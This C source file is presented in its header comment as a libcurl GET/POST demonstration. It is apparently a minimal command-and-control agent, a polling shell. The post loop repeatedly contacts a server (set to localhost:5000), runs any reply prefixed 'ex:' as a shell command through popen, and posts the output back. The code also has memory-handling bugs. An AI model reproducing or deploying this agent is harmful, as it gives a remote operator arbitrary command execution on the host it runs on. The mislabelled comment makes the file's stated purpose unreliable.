/* get and pos request demonstration with libcurl in c */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <string.h>

#ifdef _WIN32
#include <windows.h>
#define sleep(x) Sleep(1000 * (x))
#else
#include <unistd.h>
#endif

#define URL "http://localhost:5000"

void getShell(char *cmd);
char *postShell(char *cmd);
char *executeCmd(char *cmd);

// Struct to hold response data
struct ResponseData {
	char *buffer;
	size_t size;
};

// Callback function to handle the response body
size_t write_callback(void *ptr, size_t size, size_t nmemb,
		      struct ResponseData *data)
{
	size_t total_size = size * nmemb;
	data->buffer = realloc(data->buffer, data->size + total_size + 1);
	if (data->buffer == NULL) {
		fprintf(stderr,
			"Failed to allocate memory for response buffer.\n");
		return 0;
	}
	memcpy(&(data->buffer[data->size]), ptr, total_size);
	data->size += total_size;
	data->buffer[data->size] = '\0';
	return total_size;
}

int main(int argc, char *argv[])
{
	if (argc < 2) {
		printf("Usage: %s [get|post]\n", argv[0]);
		return 1;
	}

	curl_global_init(CURL_GLOBAL_ALL);

	char *first = "nuthin";
	char *output = NULL;

	switch (argv[1][0]) {
	case 'g':
		getShell(output);
		break;
	case 'p':
		while (1) {
			// printf("sending: \n%s\n", first);
			output = postShell(first);
			// printf("received: %s\n", output);
			if (strcmp(output, "nuthin") != 0) {
				first = executeCmd(output);
				printf("output is: %s\n", first);
			} else {
				sleep(1);
			}
		}
		break;
	default:
		printf("Usage: %s [get|post]\n", argv[0]);
		return 1;
	}
	return 0;
}
char *executeCmd(char *cmd)
{
	if (cmd == NULL) {
		return "command is null!";
	}
	FILE *fp;
	char path[1035];
	char *output = malloc(1);
	output[0] = '\0';
	fp = popen(cmd, "r");
	if (fp == NULL) {
		printf("Failed to run command\n");
		exit(1);
	}
	while (fgets(path, sizeof(path) - 1, fp) != NULL) {
		output = realloc(output, strlen(output) + strlen(path) + 1);
		strcat(output, path);
	}
	pclose(fp);
	return output;
}
char *postShell(char *cmd)
{
	CURL *curl;
	CURLcode res;
	curl = curl_easy_init();
	char *buffer = calloc(strlen(cmd) + 10, sizeof(char));
	strcpy(buffer, "output=");
	strcat(buffer, cmd);

	if (!curl) {
		fprintf(stderr, "curl_easy_init() failed\n");
		goto error;
	}
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
	curl_easy_setopt(curl, CURLOPT_URL, URL);
	curl_easy_setopt(curl, CURLOPT_POSTFIELDS, buffer);

	struct ResponseData response_data;
	response_data.buffer = NULL;
	response_data.size = 0;

	curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
	res = curl_easy_perform(curl);

	if (res != CURLE_OK) {
		fprintf(stderr, "curl_easy_perform() failed: %s\n",
			curl_easy_strerror(res));
		goto error;
	}

	if (response_data.size == 0 || response_data.buffer == NULL) {
		fprintf(stderr, "No response data.\n");
		goto error;
	}

	/* if the outputs first three characters are "ex:" then we know that the server is requesting we execute a command */
	if (strncmp(response_data.buffer, "ex:", 3) == 0) {
		free(buffer);
		curl_easy_cleanup(curl);
		return response_data.buffer + 3;
	} else {
		goto noex;
	}

error:
	fprintf(stderr, "error\n");
	free(response_data.buffer);
	free(buffer);
	curl_easy_cleanup(curl);
	return "nuthin";

noex:
	fprintf(stdout, "exit\n");
	free(response_data.buffer);
	free(buffer);
	curl_easy_cleanup(curl);
	return "nuthin";
}

/* get request */
void getShell(char *cmd)
{
	printf("%s\n", cmd);
	fprintf(stderr, "not implemented");
	return;
}
